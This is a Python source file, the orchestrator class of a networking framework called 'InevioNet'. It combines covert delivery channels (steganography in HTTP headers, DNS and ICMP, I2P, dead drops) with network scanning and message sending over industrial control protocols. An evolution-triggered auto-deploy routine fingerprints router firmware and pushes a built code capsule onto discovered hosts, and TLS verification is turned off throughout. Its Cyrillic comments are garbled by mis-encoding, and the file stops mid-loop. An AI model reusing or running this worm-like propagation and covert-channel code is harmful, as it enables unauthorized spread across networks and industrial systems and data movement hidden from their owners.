"""InevioNet Orchestrator вЂ” MAIN CLASS (with industrial protocols)."""
import time
import threading
from typing import Optional, Dict, Any, List, Tuple, Callable

from .core.crypto import InevioCrypto, random_id
from .core.packet import GDPPacket, create_packet
from .core.logger import get_logger, init_default_logging
from .core.constants import DataPaths, get_mode_config, DEFAULT_CONFIG
from .core.cache import get_all_cache_stats, clear_all_caches
from .core.exceptions import InevioException

from .network.transport import UniversalTransport
from .steganography.engine import SteganographyEngine
from .evolution.engine import EvolutionEngine
from .symbiotic.ecosystem import SymbioticEcosystem
from .mycelium.engine import MyceliumEngine
from .mycelium.capsule import CapsuleBuilder, CapsuleDeployer, TrustedHosts
from .ai.selector import ProtocolSelector
from .ai.recursion import WeightedRecursion

logger = get_logger("inevionet.orchestrator")


class InevioNet:
    """
    Р“Р»Р°РІРЅС‹Р№ РєР»Р°СЃСЃ InevioNet.

    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ:
        >>> net = InevioNet("my_password")
        >>> net.send("alice", b"Hello!")
        >>> success, packet = net.send_with_guarantee("bob", "Critical!")
        >>> net.stop()
    """

    def __init__(self, password, node_id=None, mode="standard",
                 auto_start=True, log_level="INFO"):
        init_default_logging(log_level)
        self.password = password
        self.node_id = node_id or f"inevionet_{random_id('', 6)}"
        self.mode = mode
        self.config = get_mode_config(mode)
        DataPaths.ensure_all()

        # Crypto
        self.crypto = InevioCrypto(password)

        # Core components
        self.transport = UniversalTransport(
            timeout=self.config.get("network", {}).get("connect_timeout_sec", 5.0))
        self.stealth = SteganographyEngine()
        # P13: I2P integration
        try:
            from .network.i2p_transport import I2PTransport
            self.i2p = I2PTransport()
        except Exception as _e:
            self.i2p = None
            logger.debug('[I2P] init skipped: %s', _e)
        self.evolution = EvolutionEngine(
            population_size=self.config.get("evolution", {}).get("population_size", 20),
            mutation_rate=self.config.get("evolution", {}).get("mutation_rate", 0.01))
        self.ecosystem = SymbioticEcosystem()
        self.mycelium = MyceliumEngine(node_id=self.node_id)
        # P16: capsule builder + deployer
        self.trusted_hosts = TrustedHosts()
        self.capsule_builder = CapsuleBuilder()
        self.capsule_deployer = CapsuleDeployer(
            trusted=self.trusted_hosts,
            ssh_user=None,
        )
        self.selector = ProtocolSelector()
        self.recursion = WeightedRecursion(
            max_depth=self.config.get("recursion", {}).get("max_depth", 5),
            probability_threshold=self.config.get("ai", {}).get("probability_threshold", 0.95))

        # P63b: RelayNode on free port from 9100
        self.relay = None
        # P66a: public addr (STUN)
        self.public_addr = None
        self.nat_type = "unknown"

        # P70f: bootstrap + gravity
        self.seed = None
        self.seed_url = None
        self.sprout = None
        self.gravity = None

        # P84-P86: advanced scanners
        self.traceroute_scan = None
        self.local_discovery = None
        try:
            from .network.traceroute_scan import TracerouteScan
            self.traceroute_scan = TracerouteScan()
            logger.info("[P84] traceroute scan created")
        except Exception as _e:
            logger.debug("[P84] %s", _e)
        try:
            from .network.mdns_ssdp_scan import LocalDiscovery
            self.local_discovery = LocalDiscovery()
            logger.info("[P85] local discovery created")
        except Exception as _e:
            logger.debug("[P85] %s", _e)

        # P82e: network tree
        self.local_map = None
        self.network_tree = None
        try:
            from .network.local_map import LocalNetworkMap
            self.local_map = LocalNetworkMap()
            logger.info("[P82e] local_map created")
        except Exception as _e:
            logger.debug("[P82e] local_map: %s", _e)
        try:
            from .mesh.network_tree import NetworkTree
            self.network_tree = NetworkTree(node_id=self.node_id)
            logger.info("[P82e] network_tree created")
        except Exception as _e:
            logger.debug("[P82e] network_tree: %s", _e)

        # P77c: audit chain
        self.audit = None
        try:
            from .audit import AuditChain
            _audit_path = None
            try:
                # P81: fix DataPaths UnboundLocalError - использовать глобальный import
                _audit_path = str(DataPaths.get_state_dir() / "audit_chain.json")
            except Exception:
                _audit_path = "audit_chain.json"
            self.audit = AuditChain(node_id=self.node_id, persist_path=_audit_path)
            logger.info("[P77c] audit chain: %d events", len(self.audit.events))
        except Exception as _e:
            logger.debug("[P77c] audit init: %s", _e)

        # P78c: contextual selector
        self.contextual_selector = None
        try:
            from .ai.selector import ContextualSelector
            _base_sel = getattr(self, "selector", None)
            self.contextual_selector = ContextualSelector(base_selector=_base_sel)
            logger.info("[P78c] contextual selector created")
        except Exception as _e:
            logger.debug("[P78c] contextual: %s", _e)
        try:
            from .mesh.gravity import GravityField
            self.gravity = GravityField()
            logger.info("[P70f] gravity field created")
        except Exception as _e:
            logger.debug("[P70f] gravity init: %s", _e)
        try:
            from .bootstrap import SproutEngine
            self.sprout = SproutEngine(self, check_interval=30)
            logger.info("[P70f] sprout engine created")
        except Exception as _e:
            logger.debug("[P70f] sprout init: %s", _e)
        try:
            from .network.relay_node import RelayNode
            import socket as _sock
            _listen_port = None
            for _p in range(9100, 9201):
                try:
                    _t = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                    _t.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
                    _t.bind(("0.0.0.0", _p))
                    _t.close()
                    _listen_port = _p
                    break
                except OSError:
                    continue
            if _listen_port:
                self.relay = RelayNode(
                    node_id=self.node_id + "_relay",
                    listen_port=_listen_port)
                import os as _os
                _os.environ["INEVIO_RELAY_PORT"] = str(_listen_port)
                logger.info("[P63b] RelayNode on port %d", _listen_port)
        except Exception as _e:
            logger.debug("[P63b] relay init: %s", _e)

        # Identity / Discovery
        self._identity = None
        self._registry = None
        self._trust = None
        self._presence = None
        self._discovery = None
        self._discovery_lock = threading.Lock()

        # Event handlers
        self._handlers: Dict[str, List[Callable]] = {
            "on_send": [], "on_receive": [], "on_delivery": [], "on_error": [],
            "on_peer_discovered": []}

        # State
        self._running = False
        self._lock = threading.Lock()

        # Statistics
        self.stats = {
            "packets_sent": 0, "packets_received": 0,
            "packets_delivered": 0, "packets_failed": 0,
            "bytes_sent": 0, "bytes_received": 0,
            "start_time": time.time(), "uptime": 0.0,
        }

        # Storage
        self.received_packets: Dict[str, GDPPacket] = {}
        self.sent_packets: Dict[str, GDPPacket] = {}

        logger.info(f"InevioNet created: node_id={self.node_id}, mode={mode}")

        if auto_start:
            self.start()

    # --- Lifecycle ---
    def start(self):
        if self._running:
            return
        self._running = True
        try:
            self._ensure_identity()
        except Exception as e:
            logger.warning(f"Identity init error: {e}")
        try:
            self.evolution.initialize()
            # P26: connect auto-deploy
            self.evolution._on_auto_deploy = self._auto_deploy_callback
        except Exception as e:
            logger.error(f"Evolution init error: {e}")
        try:
            self.ecosystem.create_standard_networks()
        except Exception as e:
            logger.error(f"Ecosystem init error: {e}")
        try:
            self.mycelium.start()
        except Exception as e:
            logger.error(f"Mycelium start error: {e}")
        try:
            self._start_discovery()
        except Exception as e:
            logger.warning(f"Discovery start error: {e}")
        # P13: topology hook
        try:
            import threading as _th
            _th.Thread(target=self._topology_loop, daemon=True, name='topology_loop').start()
            logger.info('[Relay] topology loop started')
        except Exception as _e:
            logger.debug('[Relay] topology hook error: %s', _e)
        # P91: DeadDrop
        self.dead_drop = None
        try:
            from .network.dead_drop import DeadDrop
            self.dead_drop = DeadDrop(node_id=self.node_id, poll_interval=60)
            logger.info("[P91] dead_drop created")
        except Exception as _e:
            logger.debug("[P91] dead_drop: %s", _e)

        # P91: DeadDrop
        if getattr(self, "dead_drop", None):
            try:
                self.dead_drop.start()
                logger.info("[P91] dead_drop started")
            except Exception as _e:
                logger.debug("[P91] dead_drop start: %s", _e)

        # P95: Organism - единый поток
        import os as _os95
        _use_organism = _os95.environ.get("INEVIO_ORGANISM", "1") == "1"
        if _use_organism:
            try:
                from .organism import Organism
                self.organism = Organism(self)
                import threading as _th_org
                _th_org.Thread(target=self.organism.live,
                               daemon=True, name="organism").start()
                logger.info("[P95] *** Organism started (replaces 8 loops) ***")
            except Exception as _oe:
                logger.warning("[P95] Organism failed: %s - fallback to loops", _oe)
                _use_organism = False
        if not _use_organism:
            # Fallback: старые лупы
            try:
                import threading as _th_mc
                _th_mc.Thread(target=self._multi_channel_loop,
                              daemon=True, name="multi_channel").start()
                logger.info("[P87g] multi-channel loop started")
            except Exception as _me:
                logger.debug("[P87g] multi-channel start: %s", _me)

        # P87fix: full_scan loop
        try:
            import threading as _th_scan
            _th_scan.Thread(target=self._full_scan_loop,
                            daemon=True, name="full_scan").start()
            logger.info("[P87fix] full_scan loop started")
        except Exception as _se:
            logger.debug("[P87fix] full_scan start: %s", _se)

        # P74: seed refresh loop
        try:
            import threading as _th_seed
            _th_seed.Thread(target=self._seed_refresh_loop,
                            daemon=True, name="seed_refresh").start()
            logger.info("[P74] seed refresh loop started")
        except Exception as _se:
            logger.debug("[P74] seed refresh start: %s", _se)

        # P70f: запуск SproutEngine
        if getattr(self, "sprout", None):
            try:
                self.sprout.start()
                logger.info("[P70f] sprout engine started")
            except Exception as _e:
                logger.debug("[P70f] sprout start: %s", _e)

        # P66a: network info loop
        try:
            import threading as _th_net
            _th_net.Thread(target=self._network_info_loop,
                           daemon=True,
                           name='net_info').start()
            logger.info('[P66a] network info loop started')
        except Exception as _nie:
            logger.debug('[P66a] start error: %s', _nie)

        # P63b: start RelayNode
        if getattr(self, "relay", None):
            try:
                self.relay.start()
                logger.info("[P63b] relay started")
            except Exception as _e:
                logger.debug("[P63b] relay start: %s", _e)

        # P38: mycelium growth loop
        try:
            import threading as _th_growth
            _th_growth.Thread(target=self._growth_loop, daemon=True,
                              name='growth_loop').start()
            logger.info('[Growth] mycelium growth loop started')
        except Exception as _ge:
            logger.debug('[Growth] start error: %s', _ge)
        # P43: full automation loop
        try:
            import threading as _th_auto
            _th_auto.Thread(target=self._automation_loop, daemon=True,
                            name='automation_loop').start()
            logger.info('[Auto] automation loop started')
        except Exception as _ae:
            logger.debug('[Auto] start error: %s', _ae)
        # P77d: audit start
        if getattr(self, "audit", None):
            try:
                self.audit.add_event("start", {
                    "mode": self.mode,
                    "public_addr": list(self.public_addr or []),
                    "nat_type": getattr(self, "nat_type", "unknown"),
                })
            except Exception:
                pass

        logger.info(f"InevioNet started: {self.node_id}")

    def _ensure_identity(self):
        if self._identity is not None:
            return self._identity
        from .identity import (DeviceIdentity, DeviceType, DeviceRole,
                               DeviceRegistry, TrustEngine,
                               PresenceManager, PresenceStatus)
        self._identity = DeviceIdentity.create(
            device_type=DeviceType.ENDPOINT,
            role=DeviceRole.PEER,
            nickname=self.node_id)
        self._registry = DeviceRegistry()
        self._registry.register_local(self._identity)
        self._trust = TrustEngine(local_id=self._identity.device_id.device_id)
        self._presence = PresenceManager()
        self._presence.heartbeat(self._identity.device_id.device_id,
                                 PresenceStatus.ONLINE)
        return self._identity

    def _start_discovery(self):
        with self._discovery_lock:
            if self._discovery is not None:
                return self._discovery
            from .identity.discovery import DiscoveryEngine
            self._discovery = DiscoveryEngine(
                identity=self._identity,
                registry=self._registry,
                broadcast_port=9555,
                enable_multicast=True,
                enable_beacon=True,
            )
            def _on_peer(ann):
                try:
                    for h in self._handlers.get("on_peer_discovered", []):
                        try: h(ann)
                        except Exception: pass
                except Exception:
                    pass
            self._discovery.on_discovered(_on_peer)
            self._discovery.start()
            return self._discovery

    def stop(self):
        if not self._running:
            return
        self._running = False
        try:
            if self._discovery: self._discovery.stop()
        except Exception: pass
        try: self.mycelium.stop()
        except Exception: pass
        try: self.transport.close()
        except Exception: pass
        try: self.stealth.close()
        except Exception: pass
        logger.info("InevioNet stopped")

    # --- Utilities ---
    def _prepare_payload(self, payload):
        import json
        if isinstance(payload, bytes): return payload
        if isinstance(payload, str): return payload.encode("utf-8")
        if isinstance(payload, (dict, list)):
            return json.dumps(payload, ensure_ascii=False).encode("utf-8")
        if isinstance(payload, (int, float, bool)): return str(payload).encode("utf-8")
        if payload is None: return b""
        return str(payload).encode("utf-8")

    def _decode_payload(self, payload):
        import json
        try:
            text = payload.decode("utf-8")
            if text.startswith(("{", "[")):
                try: return json.loads(text)
                except json.JSONDecodeError: pass
            return text
        except UnicodeDecodeError:
            return payload

    def _estimate_entropy(self, data):
        if not data: return 0.0
        from collections import Counter
        import math
        counter = Counter(data)
        length = len(data)
        entropy = 0.0
        for count in counter.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)
        return min(1.0, entropy / 8.0)

    def _map_protocol(self, protocol):
        mapping = {
            "TCP": "TCP", "UDP": "UDP",
            "HTTPS": "HTTP", "HTTP": "HTTP",
            "DNS": "DNS", "ICMP": "ICMP",
            "WEBSOCKET": "WebSocket",
            "MQTT": "MQTT", "MODBUS": "MODBUS",
            "DNP3": "DNP3", "OPCUA": "OPCUA", "OPC-UA": "OPCUA",
        }
        return mapping.get(protocol.upper(), "HTTP")

    def _parse_packet(self, data):
        if isinstance(data, GDPPacket): return data
        if isinstance(data, str):
            try: data = bytes.fromhex(data)
            except ValueError:
                try: return GDPPacket.from_json(data)
                except Exception: return None
        if isinstance(data, bytes):
            try: return GDPPacket.from_bytes(data)
            except Exception:
                try: return GDPPacket.from_json(data.decode("utf-8"))
                except Exception: return None
        return None

    def _resolve_target(self, receiver: str) -> str:
        """РџСЂРµРІСЂР°С‚РёС‚СЊ node_id/SSID/IP РІ target РґР»СЏ transport.send().

        РРЅРґСѓСЃС‚СЂРёР°Р»СЊРЅС‹Рµ Р°РґСЂРµСЃР° (host:port РіРґРµ port в€€ {502, 1883, 20000, 4840})
        РІРѕР·РІСЂР°С‰Р°СЋС‚СЃСЏ РєР°Рє РµСЃС‚СЊ вЂ” transport._send_auto РёС… СЂР°СЃРїРѕР·РЅР°РµС‚.
        """
        if not receiver:
            return ""
        r = receiver.strip()

        # P12-Fix-10: self-loopback вЂ” Р·РЅР°РµРј СЃРІРѕР№ endpoint
        if r == self.node_id:
            return "127.0.0.1:8080" 
        import re
        # host:port
        if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', r):
            return "https://" + r  # P15: with scheme
        # IP
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', r):
            return "https://" + r  # P15: with scheme
        # URL
        if r.startswith(("http://", "https://", "ws://", "wss://")):
            return r
        # P46: lookup in trusted_hosts (by label=node_id or host)
        try:
            for h in self.trusted_hosts.list_all():
                label = h.get('label', '') or ''
                host = h.get('host', '') or ''
                if (label == r or host == r
                        or (label and label.startswith(r))
                        or (host and host.startswith(r))):
                    if ':' in host and not host.startswith('http'):
                        return "https://" + host
                    elif host.startswith('http'):
                        return host
                    else:
                        return "https://" + host + ":8080"
        except Exception:
            pass

        # P60: via lookup in topology (relay С‡РµСЂРµР· СЃРѕСЃРµРґР°)
        try:
            topo = getattr(self, '_auto_topology', None)
            if topo and hasattr(topo, 'nodes') and r in topo.nodes:
                md = getattr(topo.nodes[r], 'metadata', {}) or {}
                via = md.get('via', '') or ''
                if via and via != self.node_id:
                    logger.info('[Resolve] %s via %s', r, via)
                    return self._resolve_target(via)
        except Exception:
            pass
        # discovery
        try:
            if self._discovery is not None:
                for ann in self._discovery.get_discovered():
                    if ann.device_id == r and ann.endpoint:
                        return ann.endpoint
        except Exception:
            pass
        # hostname
        if re.match(r'^[a-zA-Z0-9.\-]+\.(com|org|net|ru|io|local)$', r):
            return r
        # hostname:port (РґР»СЏ РёРЅРґСѓСЃС‚СЂРёР°Р»СЊРЅС‹С…)
        if re.match(r'^[a-zA-Z0-9.\-]+:\d+$', r):
            return r
        return ""

    # --- Send / Receive ---
    def send(self, receiver, payload, protocol=None, priority=5,
             use_stealth=None, stealth_method=None, metadata=None):
        try:
            data_bytes = self._prepare_payload(payload)
            encrypted = self.crypto.encrypt(data_bytes)
            if protocol is None or protocol.lower() == "auto":
                protocol = self.selector.select(receiver) or "HTTPS"

            # P13: auto-select strategies from best genome
            best_genome = self.evolution.get_best_genome() if self.evolution else None
            if use_stealth is None:
                use_stealth = best_genome.use_stego if best_genome else False
            if stealth_method is None:
                stealth_method = best_genome.stego_method if best_genome else "HTTP_HEADERS"

            packet = create_packet(
                sender=self.node_id, receiver=receiver,
                payload=encrypted, protocol=protocol,
                priority=priority, metadata=metadata or {})
            packet._is_encrypted = True
            packet.sign(self.crypto.get_signing_keypair().private_key)
            target = self._resolve_target(receiver)
            success = False
            used_method = None
            if use_stealth:
                result = self.stealth.send(
                    data=packet.to_bytes(), method=stealth_method, target=target)
                success = result.success
                used_method = ("stego", stealth_method)
            else:
                result = self.transport.send(
                    data=packet.to_bytes(),
                    protocol=self._map_protocol(protocol),
                    target=target)
                success = result.success
                used_method = ("protocol", protocol)

                # P13: fallback to steganography
                if not success:
                    logger.info("[Stealth] fallback to steganography")
                    stego_result = self.stealth.send_auto(
                        data=packet.to_bytes(),
                        target=target,
                        priorities=["HTTP_HEADERS", "DNS_QNAME", "ICMP_PAYLOAD"])
                    if stego_result.success:
                        success = True
                        used_method = ("stego", stego_result.method)
                        logger.info("[Stealth] delivered via %s", stego_result.method)

            # P13: reward for evolution
            if self.evolution and used_method:
                s_type, s_val = used_method
                self.evolution.reward(s_type, s_val, success)

            with self._lock:
                self.stats["packets_sent"] += 1
                self.stats["bytes_sent"] += len(data_bytes)
                if success:
                    self.stats["packets_delivered"] += 1
                    self.selector.record_success(receiver, protocol)
                else:
                    self.stats["packets_failed"] += 1
                    self.selector.record_failure(receiver, protocol)
                self.sent_packets[packet.packet_id] = packet
            self._trigger_event("on_send", packet)
            if success:
                self._trigger_event("on_delivery", packet)
            return packet
        except Exception as e:
            logger.error(f"Send error: {e}")
            self._trigger_event("on_error", {"error": str(e)})
            return None
    def send_with_guarantee(self, receiver, payload, protocols=None,
                            max_attempts=5, context=None, expect_ack=False):
        """РћС‚РїСЂР°РІРєР° СЃ РіР°СЂР°РЅС‚РёРµР№: РїРµСЂРµР±РѕСЂ РїСЂРѕС‚РѕРєРѕР»РѕРІ + РјР°СЃРєРёСЂРѕРІРєР° + target.

        Р Р°СЃС€РёСЂРµРЅРЅС‹Р№ СЃРїРёСЃРѕРє РІРєР»СЋС‡Р°РµС‚ РёРЅРґСѓСЃС‚СЂРёР°Р»СЊРЅС‹Рµ РїСЂРѕС‚РѕРєРѕР»С‹ (MQTT/Modbus/
        DNP3/OPC-UA). Р•СЃР»Рё target РёРјРµРµС‚ РїРѕСЂС‚ 1883/502/20000/4840 вЂ” СЃРѕРѕС‚РІРµС‚СЃС‚РІСѓСЋС‰РёР№
        РїСЂРѕС‚РѕРєРѕР» РїСЂРѕР±СѓРµС‚СЃСЏ РїРµСЂРІС‹Рј.
        """
        data_bytes = self._prepare_payload(payload)
        encrypted = self.crypto.encrypt(data_bytes)

        # РћРїСЂРµРґРµР»СЏРµРј target Рё, РµСЃР»Рё РѕРЅ СѓРєР°Р·С‹РІР°РµС‚ РЅР° РёРЅРґСѓСЃС‚СЂРёР°Р»СЊРЅС‹Р№ РїРѕСЂС‚,
        # СЃС‚Р°РІРёРј СЃРѕРѕС‚РІРµС‚СЃС‚РІСѓСЋС‰РёР№ РїСЂРѕС‚РѕРєРѕР» РїРµСЂРІС‹Рј.
        target = self._resolve_target(receiver)
        default_protocols = ["HTTPS", "DNS", "HTTP", "ICMP", "WebSocket",
                             "MQTT", "MODBUS", "DNP3", "OPCUA", "I2P"]

        if target and ":" in target and not target.startswith(("http://", "https://")):
            try:
                _, port_s = target.rsplit(":", 1)
                port = int(port_s)
                port_proto = {
                    1883: "MQTT", 8883: "MQTT",
                    502: "MODBUS",
                    20000: "DNP3",
                    4840: "OPCUA",
                }
                if port in port_proto:
                    p = port_proto[port]
                    # СЃС‚Р°РІРёРј РїРµСЂРІС‹Рј, РѕСЃС‚Р°Р»СЊРЅС‹Рµ РїРѕСЃР»Рµ
                    default_protocols = [p] + [x for x in default_protocols if x != p]
            except (ValueError, IndexError):
                pass

        protocols = protocols or default_protocols

        # P12-Fix-2: СЃРїСЂР°С€РёРІР°РµРј С„РµСЂРѕРјРѕРЅС‹ вЂ” РєР°РєРѕР№ РїСЂРѕС‚РѕРєРѕР» СЂР°Р±РѕС‚Р°РµС‚ РґР»СЏ СЌС‚РѕР№ СЃРµС‚Рё
        _myc = getattr(self, "mycelium", None)
        _pheromone_best = None
        if _myc is not None:
            try:
                _pheromone_best = _myc.pheromones.get_best_protocol(
                    source=self.node_id, destination=receiver)
                if _pheromone_best:
                    protocols = [_pheromone_best] + [
                        p for p in protocols if p != _pheromone_best]
                    logger.debug(
                        "[Pheromone] best=%s РґР»СЏ %s", _pheromone_best, receiver)
            except Exception as _e:
                logger.debug("[Pheromone] get_best_protocol: %s", _e)

        packet = create_packet(
            sender=self.node_id, receiver=receiver,
            payload=encrypted, protocol="auto", priority=8,
            max_hops=50, expect_ack=expect_ack)  # P11.3 + P12-Fix-4
        packet._is_encrypted = True
        packet.sign(self.crypto.get_signing_keypair().private_key)

        # P62d: via lookup вЂ” С‚СЂР°РЅР·РёС‚ С‡РµСЂРµР· Pheromone
        if _myc is not None:
            try:
                transit = _myc.pheromones.get_transit_path(
                    self.node_id, receiver)
                if transit and len(transit) > 1:
                    first_hop = transit[1]
                    if first_hop != receiver and first_hop != self.node_id:
                        logger.info('[P62d] via %s -> %s',
                                    first_hop, receiver)
                        packet.route_to = receiver
                        packet.origin = self.node_id
                        target_via = self._resolve_target(first_hop)
                        if target_via:
                            result = self.transport.send(
                                data=packet.to_bytes(),
                                protocol=self._map_protocol("TCP"),
                                target=target_via)
                            if result.success:
                                _myc.record_success(
                                    self.node_id, receiver, "TCP")
                                return True, packet
                            else:
                                logger.debug(
                                    '[P62d] via send failed: %s', first_hop)
            except Exception as _e:
                logger.debug('[P62d] via error: %s', _e)

        masking = getattr(self, "_masking_engine", None)
        use_masking = bool(masking) and hasattr(masking, "mask")

        alternatives = []
        for proto in protocols:
            metrics = {
                "reliability": 0.9 if proto in ("HTTPS", "MQTT", "MODBUS") else 0.6,
                "speed": 0.8 if proto == "UDP" else 0.6,
                "stealth": 0.95 if proto in ("DNS", "MQTT") else 0.6,
            }
            alternatives.append({
                "name": proto,
                "metrics": metrics,
                "protocol": proto,
            })

        # P12-Fix-11: self-loopback вЂ” РЅРµ РјР°СЃРєРёСЂСѓРµРј, РёРґС‘Рј РїСЂСЏРјРѕ
        _is_self = (target == "127.0.0.1:8080")

        # P12-Fix-12: self в†’ POST /api/relay СЃ JSON body
        def _send_to_self_http(pkt):
            import urllib.request as _urlreq
            import json as _json
            try:
                payload = _json.dumps({
                    "packet_hex": pkt.to_bytes().hex(),
                    "from": self.node_id,
                    "ts": time.time(),
                }).encode("utf-8")
                req = _urlreq.Request(
                    "https://127.0.0.1:8080/api/relay/incoming",
                    data=payload,
                    headers={"Content-Type": "application/json"})
                import ssl as _ssl_mod   # P12-Fix-14
                _ctx = _ssl_mod._create_unverified_context()
                with _urlreq.urlopen(req, timeout=5, context=_ctx) as resp:
                    data = _json.loads(resp.read().decode("utf-8"))
                    return bool(data.get("success"))
            except Exception as _e:
                logger.debug("[Self] _send_to_self_http: %s", _e)
                return False

        def try_delivery(alt, depth):
            proto = alt["protocol"]
            # P13: try relay chain first
            if proto not in ('I2P', 'MQTT', 'MODBUS', 'DNP3', 'OPCUA'):
                try:
                    chain_ok, chain_path = self._try_relay_chain(packet, receiver)
                    if chain_ok:
                        if self.evolution:
                            self.evolution.reward('protocol', proto, True)
                        return True, 0.95
                except Exception as _ce:
                    logger.debug('[Relay] chain try error: %s', _ce)
            if proto == 'I2P':
                ok, resp = self.send_via_i2p(packet.to_bytes(), target if target else 'i2p-projekt.i2p')
                if ok:
                    if self.evolution:
                        self.evolution.reward('protocol', 'I2P', True)
                    return True, 0.95
                return False, 0.3
            # P46: direct HTTP to peer (if target is http/https)
            if target and (target.startswith('http://') or target.startswith('https://')):
                try:
                    import urllib.request as _url
                    import ssl as _ssl
                    import json as _json
                    ctx = _ssl._create_unverified_context()
                    msg_data = {
                        'sender': self.node_id,
                        'message': self._decode_payload(packet.payload)
                            if hasattr(self, '_decode_payload')
                            else str(packet.payload),
                        'ts': time.time(),
                        'secure': True,
                    }
                    payload = _json.dumps(msg_data, ensure_ascii=False).encode()
                    url = target.rstrip('/') + '/api/p2/inbox'
                    req = _url.Request(
                        url, data=payload,
                        headers={'Content-Type': 'application/json'},
                        method='POST')
                    with _url.urlopen(req, timeout=5, context=ctx) as resp:
                        if resp.status == 200:
                            logger.info('[P2P] direct HTTP to %s OK', target)
                            if self.evolution:
                                self.evolution.reward('protocol', 'HTTP', True)
                            return True, 0.99
                except Exception as _he:
                    logger.debug('[P2P] direct HTTP: %s', _he)

            try:
                # P12-Fix-12: self вЂ” СЃСЂР°Р·Сѓ POST /api/relay
                if _is_self:
                    ok_self = _send_to_self_http(packet)
                    if ok_self:
                        logger.debug("[Self] packet %s РґРѕСЃС‚Р°РІР»РµРЅ РЅР° /api/relay", packet.packet_id[:16])
                        return True, 0.99
                    return False, 0.1

                # 1. РјР°СЃРєРёСЂРѕРІРєР° (РµСЃР»Рё РІРєР»СЋС‡РµРЅР°), РЅРѕ РќР• РґР»СЏ self
                if use_masking and not _is_self:
                    try:
                        result = masking.mask(
                            packet=packet, node=receiver,
                            polymorphic=(proto == "Polymorphic"),
                            context=context,
                            preferred_channel=proto if proto in (
                                "MQTT", "MODBUS", "DNP3", "OPCUA") else None,
                        )
                        if getattr(result, "success", False):
                            try:
                                masking.learn_from_result(
                                    receiver,
                                    getattr(result, "channel", proto),
                                    True)
                            except Exception:
                                pass
                            return True, 0.99
                    except Exception as e:
                        logger.debug(f"[Mask] {proto}: {e}")
                # 2. РїСЂСЏРјР°СЏ РѕС‚РїСЂР°РІРєР° СЃ target
                result = self.transport.send(
                    data=packet.to_bytes(),
                    protocol=self._map_protocol(proto),
                    target=target)
                if result.success:
                    if use_masking:
                        try:
                            masking.learn_from_result(receiver, proto, True)
                        except Exception:
                            pass
                    # P12-Fix-2: С„РµСЂРѕРјРѕРЅС‹ вЂ” СѓСЃРїРµС…
                    if _myc is not None:
                        try:
                            _myc.pheromones.mark_result(
                                source=self.node_id, destination=receiver,
                                protocol=proto, success=True)
                        except Exception:
                            pass
                    return True, 0.98
                # 3. РїСЂРѕРІР°Р» в†’ СѓС‡РёРјСЃСЏ
                if use_masking:
                    try:
                        masking.learn_from_result(receiver, proto, False)
                    except Exception:
                        pass
                # P12-Fix-2: С„РµСЂРѕРјРѕРЅС‹ вЂ” РїСЂРѕРІР°Р»
                if _myc is not None:
                    try:
                        _myc.pheromones.mark_result(
                            source=self.node_id, destination=receiver,
                            protocol=proto, success=False)
                    except Exception:
                        pass
                return False, 0.3
            except Exception as e:
                logger.debug(f"[Guarantee] {proto}: {e}")
                return False, 0.1

        rec_result = self.recursion.execute(
            alternatives=alternatives, try_func=try_delivery)
        success = rec_result.success
        with self._lock:
            self.stats["packets_sent"] += 1
            self.stats["bytes_sent"] += len(data_bytes)
            if success:
                self.stats["packets_delivered"] += 1
                packet.protocol = rec_result.path[0] if rec_result.path else "auto"
            else:
                self.stats["packets_failed"] += 1
            self.sent_packets[packet.packet_id] = packet
        return success, packet

    def send_via_i2p(self, data, target='i2p-projekt.i2p'):
        # P13: I2P integration - send via SAM bridge
        if not getattr(self, 'i2p', None):
            return False, None
        try:
            if not self.i2p.is_available():
                return False, None
            host = target
            port = 80
            if ':' in target:
                parts = target.rsplit(':', 1)
                try:
                    host = parts[0]
                    port = int(parts[1])
                except ValueError:
                    pass
            ok, resp = self.i2p.send(data, host, port)
            if ok:
                logger.info('[I2P] delivered %dB to %s', len(data), target)
            return ok, resp
        except Exception as e:
            logger.debug('[I2P] send error: %s', e)
            return False, None

    def _auto_deploy_callback(self):
        """P28: called when best_fitness >= 0.85."""
        logger.warning("[AutoDeploy] *** TRIGGERED *** fitness=%.3f",
                       self.evolution.best_genome.fitness
                       if self.evolution and self.evolution.best_genome else 0)
        if not hasattr(self, "capsule_builder"):
            logger.warning("[AutoDeploy] no capsule_builder вЂ” skip")
            return
        if not hasattr(self, "trusted_hosts"):
            logger.warning("[AutoDeploy] no trusted_hosts вЂ” skip")
            return

        try:
            code = self.capsule_builder.build_minimal()
            logger.info("[AutoDeploy] capsule: %d bytes", len(code))
        except Exception as e:
            logger.error("[AutoDeploy] build error: %s", e)
            return

        trusted = self.trusted_hosts.list_all()
        if not trusted:
            logger.warning("[AutoDeploy] no trusted hosts вЂ” triggering deploy_all")
            try:
                import urllib.request as _urlreq
                import ssl as _ssl
                ctx = _ssl._create_unverified_context()
                req = _urlreq.Request(
                    "https://127.0.0.1:8080/api/capsule/deploy_all",
                    data=b"{}",
                    headers={"Content-Type": "application/json"},
                    method="POST")
                with _urlreq.urlopen(req, timeout=60, context=ctx) as resp:
                    import json as _json
                    result = _json.loads(resp.read().decode("utf-8"))
                    logger.warning(
                        "[AutoDeploy] deploy_all: deployed=%d failed=%d skipped=%d",
                        result.get("deployed", 0),
                        result.get("failed", 0),
                        result.get("skipped", 0))
            except Exception as e:
                logger.error("[AutoDeploy] deploy_all fallback error: %s", e)
            return

        logger.info("[AutoDeploy] trying %d trusted hosts", len(trusted))
        deployed = 0
        failed = 0
        for h in trusted[:5]:  # max 5
            host = h.get("host")
            if not host:
                continue
            # P37: MAC from label (arp_XXXX)
            label = h.get("label", "")
            ip = host.split(':')[0]
            mac = ""
            if label.startswith("arp_"):
                _raw = label[4:]
                if len(_raw) == 12:
                    mac = ':'.join(_raw[i:i+2] for i in range(0, 12, 2))
            method = "auto"
            try:
                from .network.router_recon import identify_firmware
                recon = identify_firmware(ip, mac)
                if recon.get('can_deploy'):
                    method = recon.get('deploy_method', 'auto')
                    logger.info("[AutoDeploy] %s -> method=%s (mac=%s, vendor=%s)",
                                host, method, mac or "none", recon.get('vendor'))
            except Exception as _re:
                logger.debug("[AutoDeploy] recon error: %s", _re)
            try:
                ok = self.capsule_deployer.deploy(host, code, method=method)
                if ok:
                    deployed += 1
                    logger.info("[AutoDeploy] OK %s", host)
                else:
                    failed += 1
